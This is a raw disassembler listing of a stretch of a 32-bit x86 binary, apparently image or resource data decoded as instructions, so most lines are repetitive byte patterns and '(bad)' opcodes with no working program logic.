  412f87:	sbb    BYTE PTR [eax],al
  412f89:	add    BYTE PTR [eax],al
  412f8b:	sldt   WORD PTR [eax]
  412f8e:	add    BYTE PTR [eax],cl
	...
  412f98:	sub    ch,BYTE PTR [edx]
  412f9a:	sub    DWORD PTR [ecx],ebp
  412f9c:	outs   dx,DWORD PTR ds:[esi]
  412f9d:	ins    DWORD PTR es:[edi],dx
  412f9e:	outs   dx,DWORD PTR ds:[esi]
  412f9f:	loop   0x412f34
  412fa1:	nop
  412fa2:	xchg   ecx,eax
  412fa3:	call   FWORD PTR [eax+0x59]
  412fa6:	pop    ecx
  412fa7:	lds    ecx,FWORD PTR ds:0x4a0e0e
  412fad:	add    BYTE PTR [eax],al
  412faf:	sbb    al,BYTE PTR [eax]
  412fb1:	add    BYTE PTR [eax],al
  412fb3:	and    eax,0x27000000
  412fb8:	add    BYTE PTR [eax],al
  412fba:	add    BYTE PTR [eax],bh
  412fbc:	add    al,BYTE PTR [edx]
  412fbe:	add    DWORD PTR [edx],edi
  412fc0:	add    BYTE PTR [eax],al
  412fc2:	add    BYTE PTR [eax],cl
	...
  412fd4:	mov    eax,0x9e18b8b8
  412fd9:	sahf   
  412fda:	sahf   
  412fdb:	(bad)  
  412fdc:	retf   0xcaca
  412fdf:	inc    esp
  412fe1:	(bad)  
  412fe2:	(bad)  
  412fe3:	(bad)  
  412fe4:	mov    eax,0xbaffb8b8
  412fe9:	mov    edx,0xbebeffba
  412fee:	mov    esi,0xc0c0c0ff
  412ff3:	inc    ecx
  412ff5:	rol    ecx,0xff
  412ff8:	rol    ecx,0xc1
  412ffb:	inc    eax
  412ffd:	rol    al,0xff
  413000:	mov    eax,0xafffb8b8
  413005:	scas   eax,DWORD PTR es:[edi]
  413006:	scas   eax,DWORD PTR es:[edi]
  413007:	jmp    DWORD PTR [ebx-0x67005c5d]
  41300d:	cwde   
  41300e:	cwde   
  41300f:	inc    DWORD PTR [ebx+0x6dff8383]
  413015:	ins    DWORD PTR es:[edi],dx
  413016:	ins    DWORD PTR es:[edi],dx
  413017:	jmp    FWORD PTR [ecx+0x69]
  41301a:	imul   edi,edi,0xff81817f
  413020:	xchg   ebx,eax
  413021:	xchg   edx,eax
  413022:	xchg   edx,eax
  413023:	jmp    DWORD PTR [ebx-0x55005c5d]
  413029:	lods   al,BYTE PTR ds:[esi]
  41302a:	lods   al,BYTE PTR ds:[esi]
  41302b:	cld    
  41302c:	pop    esp
  41302d:	pop    esp
  41302e:	pop    esp
  41302f:	xchg   edx,eax
  413030:	dec    esi
  413031:	dec    esi
  413032:	dec    edi
  413033:	js     0x41309f
  413035:	push   0x6b
  413037:	xchg   esi,eax
  413038:	add    DWORD PTR [ebx+0x2f2f8084],0x2f
  41303f:	sub    DWORD PTR [eax],eax
  413041:	add    BYTE PTR [eax],al
  413043:	push   ss
  413044:	add    BYTE PTR [eax],al
  413046:	add    BYTE PTR [ecx],dl
  413048:	add    BYTE PTR [eax],al
  41304a:	add    BYTE PTR [ecx],cl
  41304c:	add    BYTE PTR [eax],al
  41304e:	add    BYTE PTR [eax+eax*1],al
  413051:	add    BYTE PTR [eax],al
  413053:	add    BYTE PTR [ebp+0x64],ah
  413056:	xor    ebx,DWORD PTR gs:[edi+0x5f]
  41305a:	pop    esi
  41305b:	jmp    0x41300f
  41305d:	mov    al,0xb0
  41305f:	call   FWORD PTR [esi-0x1c006666]
  413065:	loope  0x413048
  413067:	(bad)  
  413068:	fcomp  st(0)
  41306a:	fcos   
  41306c:	inc    esi
  41306d:	inc    esi
  41306e:	inc    esi
  41306f:	rol    DWORD PTR ds:0xe9a0505,cl
  413075:	push   cs
  413076:	push   cs
  413077:	mov    ebx,0xff636363
  41307c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41307d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41307e:	mov    ds:0x4a4c4bff,eax
  413083:	mov    ebp,0x55080b0a
  413088:	add    BYTE PTR [eax],al
  41308a:	add    BYTE PTR [ecx],dl
	...
  413098:	pop    edx
  413099:	pop    edx
  41309a:	pop    edx
  41309b:	(bad)  
  41309d:	push   eax
  41309e:	push   eax
  41309f:	and    BYTE PTR [esi-0x380d595a],0xc7
  4130a6:	(bad)  
  4130a7:	(bad)  
  4130a8:	mov    ecx,0xadffb9b9
  4130ad:	lods   eax,DWORD PTR ds:[esi]
  4130ae:	lods   eax,DWORD PTR ds:[esi]
  4130af:	jmp    DWORD PTR [ebp-0x5b005a5b]
  4130b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130b7:	jmp    DWORD PTR [esp+eiz*4-0x6868005c]
  4130be:	xchg   edi,eax
  4130bf:	dec    DWORD PTR [ecx+0x7dff8989]
  4130c5:	jge    0x413142
  4130c7:	push   DWORD PTR [ecx+0x71]
  4130ca:	jno    0x4130cb
  4130cc:	gs gs call FWORD PTR gs:[ebp+0x5e]
  4130d2:	pop    esi
  4130d3:	jmp    FWORD PTR [ecx+0x69]
  4130d6:	push   0xffffffff
  4130d8:	add    BYTE PTR [edx-0x6565007d],0x9b
  4130df:	jmp    FWORD PTR [ebp-0x49005155]
  4130e5:	mov    dh,0xb5
  4130e7:	(bad)  
  4130e8:	mov    ecx,0xb8f8b7b7
  4130ed:	mov    dh,0xb6
  4130ef:	out    dx,al
  4130f0:	(bad)  
  4130f2:	(bad)  
  4130f4:	fcmovnu st,st(3)
  4130f6:	(bad)  
  4130f8:	lahf   
  4130f9:	lahf   
  4130fa:	lahf   
  4130fb:	clc    
  4130fc:	jg     0x41317d
  4130fe:	jle    0x41312c
  413100:	add    BYTE PTR [eax],al
  413102:	add    BYTE PTR [ebx],al
  413104:	add    BYTE PTR [eax],al
  413106:	add    BYTE PTR ds:0x3000000,al
  41310c:	add    BYTE PTR [eax],al
  41310e:	add    BYTE PTR [ecx],al
  413110:	add    BYTE PTR [eax],al
  413112:	add    BYTE PTR [eax],al
  413114:	cdq    
  413115:	cwde   
  413116:	fwait
  413117:	mov    dh,BYTE PTR [eax-0x57005354]
  41311d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41311e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41311f:	call   DWORD PTR [esi-0x54006e6f]
  413125:	stos   BYTE PTR es:[edi],al
  413126:	stos   DWORD PTR es:[edi],eax
  413127:	dec    edi
  413129:	iret   
  41312a:	sar    bh,1
  41312c:	ret    0xc2c2
  41312f:	call   FWORD PTR [eax-0x74006768]
  413135:	mov    ecx,DWORD PTR [ebx+0x5e5e5eff]
  41313b:	loop   0x4131aa
  41313d:	ins    DWORD PTR es:[edi],dx
  41313e:	ins    DWORD PTR es:[edi],dx
  41313f:	mov    bl,0xd1
  413141:	rcl    ecx,1
  413143:	stc    
  413144:	(bad)
  413147:	call   DWORD PTR [ebp+0x55]
  41314a:	push   esp
  41314b:	leave  
  41314c:	adc    dl,BYTE PTR [edx]
  41314e:	adc    BYTE PTR [edi+0x0],bl
  413151:	add    BYTE PTR [eax],al
  413153:	adc    eax,DWORD PTR [eax]
	...
  41315d:	add    BYTE PTR [eax],al
  41315f:	add    BYTE PTR [ebx+0x43],al
  413162:	inc    ebx
  413163:	cs dec esi
  413165:	dec    esi
  413166:	dec    ebp
  413167:	cdq    
  413168:	lea    ecx,[ebp-0x5e5e1972]
  41316e:	mov    eax,ds:0xa5a6a6ff
  413173:	call   FWORD PTR [edi-0x7a006161]
  413179:	test   DWORD PTR [ebp+0x777878ff],eax
  41317f:	(bad)  
  413180:	jp     0x4131fc
  413182:	jns    0x413183
  413184:	jp     0x413201
  413186:	jl     0x413187
  413188:	jg     0x413209
  41318a:	cmp    edi,0xff8a8988
  413190:	popf   
  413191:	popf   
  413192:	lahf   
  413193:	jmp    FWORD PTR [ebx-0x50005255]
  413199:	scas   al,BYTE PTR es:[edi]
  41319a:	scas   al,BYTE PTR es:[edi]
  41319b:	push   DWORD PTR [ecx-0x49004f51]
  4131a1:	mov    bh,0xb7
  4131a3:	push   DWORD PTR [ebx-0x46004b4c]
  4131a9:	ret    
  4131aa:	vshufps ymm2,ymm0,ymm3,0xd4
  4131af:	inc    edx
  4131b1:	ret    
  4131b2:	(bad)  
  4131b5:	mov    esi,0xa7a7febe
  4131ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131bb:	push   DWORD PTR [eax+0x70]
  4131be:	jo     0x413209
	...
  4131d4:	nop
  4131d5:	(bad)  
  4131d6:	xchg   ecx,eax
  4131d7:	sub    DWORD PTR [edx-0x50005859],0xffffffaa
  4131de:	stos   BYTE PTR es:[edi],al
  4131df:	call   FWORD PTR [edi-0x4d006364]
  4131e5:	mov    al,0xb2
  4131e7:	dec    eax
  4131e9:	enter  0xffcc,0xab
  4131ed:	lods   al,BYTE PTR ds:[esi]
  4131ee:	lods   al,BYTE PTR ds:[esi]
  4131ef:	jmp    FWORD PTR [ebp-0x47005354]
  4131f5:	mov    eax,0x8484ffb8
  4131fa:	test   cl,dh
  4131fc:	cs cs cs mov ch,0x19
  413201:	sbb    DWORD PTR [ecx],ebx
  413203:	(bad)  
  413204:	jno    0x413278
  413206:	jae    0x4131bf
  413208:	rcl    dl,cl
  41320a:	shl    ah,cl
  41320c:	mov    bh,0xb7
  41320e:	mov    bh,0xff
  413210:	push   esi
  413211:	push   esi
  413212:	push   ebx
  413213:	mov    esi,0x6b181818
  413218:	add    BYTE PTR [eax],al
  41321a:	add    BYTE PTR [edi],ah
  41321c:	add    BYTE PTR [eax],al
  41321e:	add    BYTE PTR [esi],al
	...
  413228:	pop    ds
  413229:	and    BYTE PTR [eax],ah
  41322b:	or     BYTE PTR [ecx],bh
  41322d:	cmp    DWORD PTR [edx],edi
  41322f:	xor    al,0x79
  413231:	jns    0x4132ae
  413233:	(bad)  
  413234:	xchg   esp,eax
  413235:	xchg   ebp,eax
  413236:	xchg   ebp,eax
  413237:	cli    
  413238:	test   DWORD PTR [ebp-0x75740077],eax
  41323e:	(bad)  
  41323f:	dec    DWORD PTR [esi-0x6e006d72]
  413245:	nop
  413246:	xchg   ebp,eax
  413247:	call   DWORD PTR [edi-0x5e006569]
  41324d:	mov    eax,ds:0xaaaaffa4
  413252:	lods   al,BYTE PTR ds:[esi]
  413253:	jmp    FWORD PTR [eax-0x50004f53]
  413259:	mov    ecx,0xc8b7ffbc
  41325e:	retf   
  41325f:	dec    eax
  413261:	fcomp  st(3)
  413263:	call   ecx
  413265:	fsubrp st(1),st
  413267:	(bad)  
  413268:	(bad)  
  41326a:	(bad)  
  41326b:	(bad)  
  41326c:	(bad)  
  41326e:	leave  
  41326f:	dec    ebx
  413271:	retf   0xfec8
  413274:	rol    ebp,0xc5
  413277:	cld    
  413278:	stos   BYTE PTR es:[edi],al
  413279:	test   al,0xa8
  41327b:	inc    DWORD PTR [esi+0x6d8686]
	...
  413291:	add    BYTE PTR [eax],al
  413293:	add    BYTE PTR [ecx-0x517c6d70],dl
  413299:	stos   BYTE PTR es:[edi],al
  41329a:	stos   DWORD PTR es:[edi],eax
  41329b:	push   DWORD PTR [ebp-0x58004e50]
  4132a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132a3:	push   DWORD PTR [esi-0x3f00494c]
  4132a9:	mov    edi,0xb8b8ffc0
  4132ae:	mov    eax,0xbababaff
  4132b3:	jmp    FWORD PTR [edi-0x32005051]
  4132b9:	int    0xcd
  4132bb:	(bad)  
  4132bc:	jmp    0xa9411caa
  4132c1:	test   al,0xa8
  4132c3:	cli    
  4132c4:	cmp    DWORD PTR [eax],edi
  4132c6:	cmp    BYTE PTR [ebx-0x69e1e3e4],dh
  4132cc:	add    DWORD PTR [ebx-0x90a257c],0xfffffff5
  4132d3:	jmp    DWORD PTR [ebx+0x19ffa2a2]
  4132d9:	pop    ss
  4132da:	pop    ss
  4132db:	test   DWORD PTR [edi],edx
  4132dd:	pop    ss
  4132de:	sbb    BYTE PTR [esi],ah
  4132e0:	dec    eax
  4132e1:	dec    eax
  4132e2:	dec    edx
  4132e3:	inc    eax
  4132e4:	jae    0x413359
  4132e6:	ja     0x41335c
  4132e8:	add    DWORD PTR [ecx-0x77775a7a],0xffffff8c
  4132ef:	int3   
  4132f0:	mov    cl,BYTE PTR [ecx-0x75751373]
  4132f6:	mov    ?,edi
  4132f8:	mov    WORD PTR [edx+edx*4-0x6b707401],cs
  4132ff:	dec    DWORD PTR [ebx-0x7300696f]
  413305:	xchg   esi,eax
  413306:	pushf  
  413307:	call   FWORD PTR [edx-0x4e005258]
  41330d:	mov    edi,0xd1c7ffc3
  413312:	aam    0xff
  413314:	rcl    ecx,1
  413316:	sar    bh,cl
  413318:	rol    ecx,cl
  41331a:	mov    esi,0xa4acdbff
  41331f:	call   ebp
  413321:	jg     0x413395
  413323:	dec    edx
  413325:	dec    eax
  413326:	xor    al,0xff
  413328:	rcl    BYTE PTR ds:0x19b4ff06,0x13
  41332f:	(bad)  
  413330:	mov    esp,0xc9ffa4a9
  413335:	(bad)  
  413337:	cld    
  413338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41333a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41333b:	call   FWORD PTR [edi+0x8d9f9f]
	...
  413351:	add    BYTE PTR [eax],al
  413353:	add    BYTE PTR [edx-0x497c6c70],dl
  413359:	mov    cl,0xb2
  41335b:	(bad)  
  41335c:	mov    ebp,0xb0ffb9b8
  413361:	stos   BYTE PTR es:[edi],al
  413362:	lods   eax,DWORD PTR ds:[esi]
  413363:	(bad)  
  413364:	mov    esi,0xbbffbdbc
  413369:	mov    ebx,0x8e8effbb
  41336e:	mov    ?,edi
  413370:	call   0xb5b5:0xb5ff9a9a
  413377:	push   DWORD PTR [ebp-0x3f004a4b]
  41337d:	rol    al,0xff
  413380:	jmp    0x41336d
  413382:	jmp    0x413383
  413384:	cmc    
  413385:	cmc    
  413386:	cmc    
  413387:	call   DWORD PTR [eax+0x55f69090]
  41338d:	push   ebp
  41338e:	push   esi
  41338f:	in     eax,dx
  413390:	pusha  
  413391:	popa   
  413392:	(bad)  
  413393:	hlt    
  413394:	jno    0x413406
  413396:	jae    0x41336d
  413398:	mov    DWORD PTR [edi-0x60602775],eax
  41339e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41339f:	cmc    
  4133a0:	lahf   
  4133a1:	lahf   
  4133a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133a3:	call   FWORD PTR [edx-0x6d005e63]
  4133a9:	xchg   edi,eax
  4133aa:	fwait
  4133ab:	call   DWORD PTR [eax-0x6e006269]
  4133b1:	popf   
  4133b2:	mov    eax,ds:0xaca796ff
  4133b7:	jmp    DWORD PTR [ebx-0x52004b50]
  4133bd:	scas   al,BYTE PTR es:[edi]
  4133be:	scas   eax,DWORD PTR es:[edi]
  4133bf:	(bad)  
  4133c0:	mov    ecx,0xc6ffaba9
  4133c5:	mov    al,0xb0
  4133c7:	dec    eax
  4133c9:	mov    ds:0x87c8ff9e,eax
  4133ce:	jle    0x4133cf
  4133d0:	leave  
  4133d1:	bound  edx,QWORD PTR [ebx-0x1]
  4133d4:	mov    ebx,0xb4ff162a
  4133d9:	or     eax,DWORD PTR [eax]
  4133db:	jmp    FWORD PTR [ebx-0x5b00fff8]
  4133e1:	or     DWORD PTR [eax],eax
  4133e3:	jmp    DWORD PTR [edx-0x5c00ffee]
  4133e9:	push   cs
  4133ea:	add    bh,bh
  4133ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133ed:	adc    al,0x1
  4133ef:	(bad)  
  4133f0:	mov    ebp,0xcdff9b9e
  4133f5:	fstp   st(7)
  4133f7:	(bad)  
  4133f8:	stos   BYTE PTR es:[edi],al
  4133f9:	test   eax,0x9999ffa9
  4133fe:	cdq    
  4133ff:	mov    cl,0x0
	...
  413411:	add    BYTE PTR [eax],al
  413413:	add    BYTE PTR [ecx-0x417c6c6e],dl
  413419:	mov    bh,0xb7
  41341b:	inc    ecx
  41341d:	mov    edx,0xaaaeffbd
  413422:	lods   al,BYTE PTR ds:[esi]
  413423:	(bad)  
  413424:	mov    esp,0xbcffbbba
  413429:	mov    esp,0x9f9fffbf
  41342e:	lahf   
  41342f:	call   FWORD PTR [eax-0x6f006768]
  413435:	nop
  413436:	nop
  413437:	call   FWORD PTR [eax-0x6b006668]
  41343d:	xchg   ebx,eax
  41343e:	xchg   ebp,eax
  41343f:	call   DWORD PTR [ecx-0x67006c6f]
  413445:	call   0xff9b:0x9698ff9a
  41344c:	pushf  
  41344d:	fwait
  41344e:	mov    eax,ds:0xaaa6a4ff
  413453:	jmp    DWORD PTR [ecx+ebp*4-0x50590053]
  41345a:	mov    dl,0xff
  41345c:	test   al,0xb2
  41345e:	mov    bh,0xff
  413460:	test   eax,0xaeffbcb6
  413465:	mov    ebp,0xb8afffc2
  41346a:	mov    edx,0xa8a7b3ff
  41346f:	inc    ecx
  413471:	mov    ds:0x90c4ffa0,al
  413476:	mov    ?,edi
  413478:	mov    ebx,0xb4ff6a6f
  41347d:	inc    esi
  41347e:	cmp    al,0xff
  413480:	test   eax,0xa1ff1625
  413485:	or     al,BYTE PTR [eax]
  413487:	jmp    DWORD PTR [ecx-0x5e00fffa]
  41348d:	push   es
  41348e:	add    bh,bh
  413490:	mov    ds:0xa6ff000e,al
  413495:	sbb    ecx,DWORD PTR [edx]
  413497:	jmp    FWORD PTR [eax-0x5300eddf]
  41349d:	and    eax,0x28b1ff13
  4134a2:	adc    al,0xff
  4134a4:	mov    dl,0x29
  4134a6:	adc    eax,0x1024b3ff
  4134ab:	push   DWORD PTR [ebp-0x3e00f6e3]
  4134b1:	xchg   edi,eax
  4134b2:	xchg   ecx,eax
  4134b3:	dec    edi
  4134b5:	(bad)  
  4134b7:	(bad)  
  4134b8:	mov    cl,0xae
  4134ba:	scas   al,BYTE PTR es:[edi]
  4134bb:	call   FWORD PTR [edx+0xcc9b9b]
	...
  4134d1:	add    BYTE PTR [eax],al
  4134d3:	add    BYTE PTR [ebx-0x3b7a6b6f],dl
  4134d9:	mov    esi,0xbec6ffbf
  4134de:	sar    edi,0xb0
  4134e1:	lods   al,BYTE PTR ds:[esi]
  4134e2:	stos   DWORD PTR es:[edi],eax
  4134e3:	(bad)  
  4134e4:	mov    ebp,0xbbffbbba
  4134e9:	mov    ebx,0x9d9dffbc
  4134ee:	popf   
  4134ef:	call   FWORD PTR [ebp-0x62006263]
  4134f5:	popf   
  4134f6:	lahf   
  4134f7:	dec    DWORD PTR [esi-0x6d006d72]
  4134fd:	(bad)  
  4134fe:	xchg   ebp,eax
  4134ff:	dec    DWORD PTR [edx+0x7aff9392]
  413505:	mov    ds:0x9f92ff91,eax
  41350a:	mov    ds:0xb4afa2ff,eax
  41350f:	push   DWORD PTR [ebx-0x3f00373d]
  413515:	into   
  413516:	iret   
  413517:	inc    ecx
  413519:	ret    0xffc1
  41351c:	mov    ecx,0xbaffa0a2
  413521:	xchg   DWORD PTR [eax+0x6b6db3ff],eax
  413527:	jmp    DWORD PTR [edi-0x6100b5b4]
  41352d:	sub    al,0x24
  41352f:	call   FWORD PTR [eax-0x7400fff2]
  413535:	add    BYTE PTR [eax],al
  413537:	dec    DWORD PTR [ebx-0x70010000]
  41353d:	add    BYTE PTR [eax],al
  41353f:	call   DWORD PTR [ebx-0x6000fffb]
  413545:	sbb    ecx,DWORD PTR [edx]
  413547:	jmp    FWORD PTR [ebx-0x5100e3d5]
  41354d:	sub    al,0x1c
  41354f:	push   DWORD PTR [ecx-0x4c00e3d2]
  413555:	xor    BYTE PTR [ebx],bl
  413557:	push   DWORD PTR [ebp-0x4700e3d1]
  41355d:	xor    BYTE PTR ds:0x1f31baff,bl
  413563:	(bad)  
  413564:	mov    esp,0xbdff1f33
  413569:	xor    bl,BYTE PTR [edi]
  41356b:	(bad)  
  41356c:	mov    ebp,0xc3ff0c22
  413571:	mov    BYTE PTR [edi-0x1],bh
  413574:	into   
  413575:	fsubrp st(1),st
  413577:	push   DWORD PTR [ebp-0x65004b4b]
  41357d:	cdq    
  41357e:	cdq    
  41357f:	fld    QWORD PTR [eax]
	...
  413591:	add    BYTE PTR [eax],al
  413593:	add    BYTE PTR [ecx-0x35796a6e],dl
  413599:	ret    
  41359a:	ret    
  41359b:	dec    edx
  41359d:	(bad)  
  41359e:	(bad)  
  41359f:	push   DWORD PTR [ecx-0x42005354]
  4135a5:	mov    edx,0xbbbbffbb
  4135aa:	mov    esp,0x9d9d9dff
  4135af:	call   FWORD PTR [edi-0x4d006061]
  4135b5:	mov    dl,0xb3
  4135b7:	call   DWORD PTR [esi-0x6a006569]
  4135bd:	cdq    
  4135be:	popf   
  4135bf:	jmp    FWORD PTR [ebp+edi*4-0x3c4b0043]
  4135c6:	mov    edi,0xacabb5ff
  4135cb:	jmp    FWORD PTR [ebp-0x57007c7a]
  4135d1:	pusha  
  4135d2:	pop    ebp
  4135d3:	jmp    DWORD PTR [edx-0x6900bab9]
  4135d9:	sub    eax,0x138dff2c
  4135de:	push   cs
  4135df:	inc    DWORD PTR [eax+eax*1+0x7aff00]
  4135e6:	add    bh,bh
  4135e8:	jl     0x4135ea
  4135ea:	add    bh,bh
  4135ec:	test   DWORD PTR [eax],eax
  4135ee:	add    bh,bh
  4135f0:	mov    al,BYTE PTR ds:0xf92ff00
  4135f6:	add    bh,bh
  4135f8:	xchg   edi,eax
  4135f9:	adc    BYTE PTR [eax],al
  4135fb:	call   FWORD PTR [ecx+edx*1+0x12a2ff00]
  413602:	add    bh,bh
  413604:	scas   al,BYTE PTR es:[edi]
  413605:	sub    BYTE PTR [esi],dl
  413607:	push   DWORD PTR [esi-0x4900d9c9]
  41360d:	ss and eax,0x2638b8ff
  413613:	(bad)  
  413614:	mov    ebx,0xbfff2737
  413619:	cmp    esp,DWORD PTR [edi]
  41361b:	inc    edx
  41361d:	cmp    al,0x29
  41361f:	inc    esp
  413621:	ds sub bh,bh
  413624:	(bad)  
  413625:	aas    
  413626:	sub    edi,edi
  413628:	mov    DWORD PTR [edx+0x2c],0x142ec7ff
  41362f:	inc    edi
  413631:	js     0x4136a0
  413633:	dec    edi
  413635:	fstp   st(7)
  413637:	(bad)  
  413638:	mov    ecx,0x9affbbbb
  41363d:	cdq    
  41363e:	cdq    
  41363f:	jmp    0x0:0x0
	...
  413652:	add    BYTE PTR [eax],al
  413654:	xchg   edx,eax
  413655:	xchg   ecx,eax
  413656:	xchg   ebp,eax
  413657:	xchg   ah,cl
  413659:	mov    edi,0xc6c6ccff
  41365f:	push   DWORD PTR [ebx-0x44005152]
  413665:	mov    ebx,0xbcbcffbd
  41366a:	mov    ebp,0xa1a0a0ff
  41366f:	jmp    DWORD PTR [ecx-0x4c005e5f]
  413675:	mov    bl,0xb3
  413677:	jmp    DWORD PTR [eax+ebp*4-0x705d0054]
  41367e:	mov    ?,edi
  413680:	xchg   esi,eax
  413681:	cmp    DWORD PTR [eax],edi
  413683:	call   DWORD PTR [esi-0x7100d7db]
  413689:	sbb    dl,BYTE PTR [edi+edi*8]
  41368c:	mov    BYTE PTR [ebx],cl
  41368e:	add    bh,bh
  413690:	add    BYTE PTR [eax],0x0
  413693:	(bad)  
  413694:	jl     0x413696
  413696:	add    bh,bh
  413698:	jge    0x41369a
  41369a:	add    bh,bh
  41369c:	jg     0x41369e
  41369e:	add    bh,bh
  4136a0:	add    DWORD PTR [edi],0xd87ff00
  4136a6:	add    bh,bh
  4136a8:	mov    cs,WORD PTR [edi]
  4136aa:	add    bh,bh
  4136ac:	nop
  4136ad:	(bad)  
  4136af:	call   DWORD PTR [ebx+0x7eff010f]
  4136b5:	and    bl,BYTE PTR [eax]
  4136b7:	(bad)  
  4136b8:	jp     0x4136d2
  4136ba:	or     eax,0x119fff
  4136bf:	jmp    FWORD PTR [eax-0x4b00feec]
  4136c5:	xor    DWORD PTR [edi],ebx
  4136c7:	(bad)  
  4136c8:	mov    esp,0xbfff3242
  4136cd:	inc    edx
  4136ce:	xor    edi,edi
  4136d0:	ret    
  4136d1:	inc    esp
  4136d2:	xor    edi,edi
  4136d4:	mov    BYTE PTR [esi+0x32],0xff
  4136d8:	enter  0x3448,0xff
  4136dc:	retf   
  4136dd:	dec    ecx
  4136de:	xor    eax,0x364bcdff
  4136e3:	dec    edi
  4136e5:	dec    esp
  4136e6:	aaa    
  4136e7:	call   eax
  4136e9:	dec    edi
  4136ea:	cmp    bh,bh
  4136ec:	sar    DWORD PTR [ebx],1
  4136ee:	and    bh,bh
  4136f0:	retf   0x5e6c
  4136f3:	dec    ebp
  4136f5:	xlat   BYTE PTR ds:[ebx]
  4136f6:	fdivr  st,st(7)
  4136f8:	(bad)  
  4136f9:	enter  0xffc8,0x9b
  4136fd:	call   0x0:0xf09a
	...
  413714:	xchg   ebx,eax
  413715:	nop
  413716:	xchg   esp,eax
  413717:	xchg   al,dl
  413719:	leave  
  41371a:	enter  0xcfff,0xc9
  41371e:	retf   0xb3ff
  413721:	mov    al,0xb1
  413723:	(bad)  
  413724:	mov    ebx,0xbfffbbb9
  413729:	mov    edi,0xa6a6ffbf
  41372e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41372f:	jmp    DWORD PTR [ebp-0x50005a5b]
  413735:	scas   eax,DWORD PTR es:[edi]
  413736:	scas   eax,DWORD PTR es:[edi]
  413737:	push   DWORD PTR [edx-0x62004448]
  41373d:	mov    DWORD PTR [edx+0x7cff],ecx
  413743:	inc    DWORD PTR [edx-0x7600ffff]
  413749:	push   cs
  41374a:	push   es
  41374b:	dec    DWORD PTR [ecx-0x7700f8ef]
  413751:	adc    cl,BYTE PTR [eax]
  413753:	inc    DWORD PTR [edi-0x7900f8ef]
  413759:	(bad)  
  41375b:	inc    DWORD PTR [ebp-0x7800fef5]
  413761:	or     al,0x0
  413763:	dec    DWORD PTR [ebp-0x6d00fff3]
  413769:	push   cs
  41376a:	add    bh,bh
  41376c:	xchg   esp,eax
  41376d:	(bad)  
  41376f:	(bad)  
  413770:	jg     0x4137a2
  413772:	daa    
  413773:	jmp    FWORD PTR [eax-0x5b00595a]
  413779:	mov    al,ds:0x1983ff9f
  41377e:	or     eax,0x518acff
  413783:	(bad)  
  413784:	mov    edi,0xc6ff3041
  413789:	push   edx
  41378a:	inc    ecx
  41378b:	dec    ecx
  41378d:	push   ecx
  41378e:	inc    eax
  41378f:	dec    ebp
  413791:	push   ebx
  413792:	aas    
  413793:	call   eax
  413795:	push   ebp
  413796:	inc    eax
  413797:	call   edx
  413799:	push   edi
  41379a:	inc    ebx
  41379b:	call   esp
  41379d:	pop    eax
  41379e:	inc    esp
  41379f:	call   esi
  4137a1:	pop    edx
  4137a2:	inc    ebp
  4137a3:	(bad)  
  4137a4:	fcomp  DWORD PTR [ebx+0x46]
  4137a7:	(bad)  
  4137a8:	fstp   DWORD PTR [esi+0x49]
  4137ab:	(bad)  
  4137ac:	fmul   QWORD PTR [esi+0x35]
  4137af:	call   ebx
  4137b1:	arpl   WORD PTR [eax-0x1],dx
  4137b4:	int    0xcd
  4137b6:	int3   
  4137b7:	dec    esp
  4137b9:	rcl    ebx,cl
  4137bb:	call   FWORD PTR [esp+ebx*4-0x67680b64]
  4137c2:	cwde   
  4137c3:	adc    eax,DWORD PTR [eax]
	...
  4137d1:	add    BYTE PTR [eax],al
  4137d3:	add    BYTE PTR [ebx-0x2f796c70],dl
  4137d9:	leave  
  4137da:	retf   0xceff
  4137dd:	enter  0xffc9,0xb3
  4137e1:	scas   eax,DWORD PTR es:[edi]
  4137e2:	mov    al,0xff
  4137e4:	mov    ebx,0xbfffbab9
  4137e9:	mov    edi,0xa9a9ffc1
  4137ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ef:	jmp    FWORD PTR [ecx-0x53005657]
  4137f5:	lods   al,BYTE PTR ds:[esi]
  4137f6:	lods   al,BYTE PTR ds:[esi]
  4137f7:	(bad)  
  4137f8:	mov    edx,0xa4ffbdbc
  4137fd:	mov    ds:0xe82ffa5,al
  413802:	add    eax,0x121b90ff
  413807:	call   DWORD PTR [edx-0x7100e2db]
  41380d:	push   ds
  41380e:	adc    eax,0x121b8cff
  413813:	dec    DWORD PTR [ebx-0x7600f1e9]
  413819:	adc    al,0xc
  41381b:	dec    DWORD PTR [ecx-0x7200f9ee]
  413821:	or     eax,0xd91ff00
  413826:	add    bh,bh
  413828:	xchg   ebp,eax
  413829:	(bad)  
  41382b:	(bad)  
  41382c:	jnp    0x413853
  41382e:	sbb    al,0xff
  413830:	mov    bl,0xaa
  413832:	test   eax,0xb6b6b6ff
  413837:	(bad)  
  413838:	mov    esi,0x89ffbebe
  41383d:	fs popa 
  41383f:	jmp    DWORD PTR [ebx-0x3700f5e3]
  413845:	push   eax
  413846:	ds dec esi
  413849:	pusha  
  41384a:	dec    esi
  41384b:	call   ecx
  41384d:	pop    esi
  41384e:	dec    esp
  41384f:	call   ebp
  413851:	pusha  
  413852:	dec    ebp
  413853:	call   edi
  413855:	bound  ecx,QWORD PTR [esi-0x1]
  413858:	fldenv [eax+edx*2-0x1]
  41385c:	(bad)  [ebp+0x50]
  41385f:	(bad)  
  413860:	fisub  WORD PTR [esi+0x51]
  413863:	(bad)  
  413864:	fbld   TBYTE PTR [edi+0x52]
  413867:	jmp    ecx
  413869:	ins    BYTE PTR es:[edi],dx
  41386a:	push   edi
  41386b:	jmp    esp
  41386d:	pop    edi
  41386e:	inc    edi
  41386f:	(bad)  
